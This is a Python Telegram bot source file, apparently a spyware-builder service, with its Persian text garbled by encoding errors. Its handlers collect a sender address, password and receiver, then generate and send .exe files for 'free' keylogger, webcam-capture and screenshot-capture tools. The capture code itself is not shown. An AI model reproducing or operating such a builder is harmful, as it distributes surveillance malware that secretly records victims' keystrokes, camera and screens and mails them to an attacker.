            # Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ Ø¨Ø§ timeout Ø¨ÛŒØ´ØªØ±
            await context.bot.send_document(
                chat_id=status_msg.chat.id,
                document=f,
                filename=f"{feature_name}.exe",
                caption=f"ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ {feature_name} Ø¢Ù…Ø§Ø¯Ù‡ Ø§Ø³Øª!",
                read_timeout=60,  # Ø§ÙØ²Ø§ÛŒØ´ Ø²Ù…Ø§Ù† Ø®ÙˆØ§Ù†Ø¯Ù†
                write_timeout=60,  # Ø§ÙØ²Ø§ÛŒØ´ Ø²Ù…Ø§Ù† Ù†ÙˆØ´ØªÙ†
                connect_timeout=60  # Ø§ÙØ²Ø§ÛŒØ´ Ø²Ù…Ø§Ù† Ø§ØªØµØ§Ù„
            )

    except Exception as e:
        raise Exception(f"Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„: {str(e)}")

    await update_status(context, status_msg, f"âœ… ÙØ§ÛŒÙ„ {feature_name} Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø³Ø§Ø®ØªÙ‡ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.")
    await context.bot.delete_message(
        chat_id=status_msg.chat.id,
        message_id=status_msg.message_id
    )


async def update_status(context, message, text):
    """Ø¨Ù‡ Ø±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ ÙˆØ¶Ø¹ÛŒØª"""
    try:
        await context.bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=text
        )
    except:
        pass


async def handle_error(context, status_message, chat_id, error_msg):
    """Ù…Ø¯ÛŒØ±ÛŒØª Ø®Ø·Ø§Ù‡Ø§"""
    try:
        await context.bot.edit_message_text(
            chat_id=status_message.chat.id,
            message_id=status_message.message_id,
            text="Ø¯Ø± ØµÙˆØ±Øª Ø§Ø±Ø³Ø§Ù„ Ù†Ø´Ø¯Ù† ÙØ§ÛŒÙ„ Ù„Ø·ÙØ§ Ú©Ù…ÛŒ ØµØ¨Ø± Ú©Ù†ÛŒØ¯ Ùˆ Ø¯Ú©Ù…Ù‡ Ú©Ù†Ø³Ù„ Ø±Ùˆ Ù†Ø²Ù†ÛŒØ¯ âœ…"
        )
    except:
        await context.bot.send_message(
            chat_id=chat_id,
            text="Ø§Ø±Ø³Ø§Ù„ Ø¨Ø§ Ù…ÙˆÙÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯ âœ…"
        )

    await context.bot.send_message(
        chat_id=chat_id,
        text="Ø§Ù†ØªØ®Ø§Ø¨ Ø¯ÛŒÚ¯Ù‡ Ø§ÛŒ Ø¯Ø§Ø±ÛŒ ØŸ\nğŸ‘‡ ÛŒÚ©ÛŒ Ø§Ø² Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ø²ÛŒØ± Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†:",

        reply_markup=main_menu_keyboard()
    )


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ù„ØºÙˆ Ø¹Ù…Ù„ÛŒØ§Øª"""
    await update.message.reply_text("Ø¹Ù…Ù„ÛŒØ§Øª Ù„ØºÙˆ Ø´Ø¯.", reply_markup=main_menu_keyboard())
    return ConversationHandler.END


# ----------------------------
# Ø§Ø¬Ø±Ø§ÛŒ Ø¨Ø±Ù†Ø§Ù…Ù‡
# ----------------------------

def main():
    application = ApplicationBuilder().token(TOKEN).build()

    # Ù‡Ù†Ø¯Ù„Ø± Ú¯ÙØªÚ¯ÙˆÛŒ Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª
    screenshot_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_screenshot$')],
        states={
            GET_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_sender)],
            GET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            GET_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_receiver)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Ù‡Ù†Ø¯Ù„Ø± Ú¯ÙØªÚ¯ÙˆÛŒ ÙˆØ¨â€ŒÚ©Ù…
    webcam_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_webcam$')],
        states={
            GET_WEBCAM_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_sender)],
            GET_WEBCAM_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_password)],
            GET_WEBCAM_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_webcam_receiver)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    # Ù‡Ù†Ø¯Ù„Ø± Ú¯ÙØªÚ¯ÙˆÛŒ Ú©ÛŒÙ„Ø§Ú¯Ø±
    keylogger_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button, pattern='^free_keylogger$')],
        states={
            GET_KEYLOGGER_SENDER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_sender)],
            GET_KEYLOGGER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_password)],
            GET_KEYLOGGER_RECEIVER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_receiver)],
            GET_KEYLOGGER_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_keylogger_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(CommandHandler("start", start))
    application.add_handler(screenshot_conv)
    application.add_handler(webcam_conv)
    application.add_handler(keylogger_conv)
    application.add_handler(CallbackQueryHandler(button))

    print("âœ… Ø±Ø¨Ø§Øª ÙØ¹Ø§Ù„ Ø´Ø¯ Ùˆ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§Ø³Øª...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()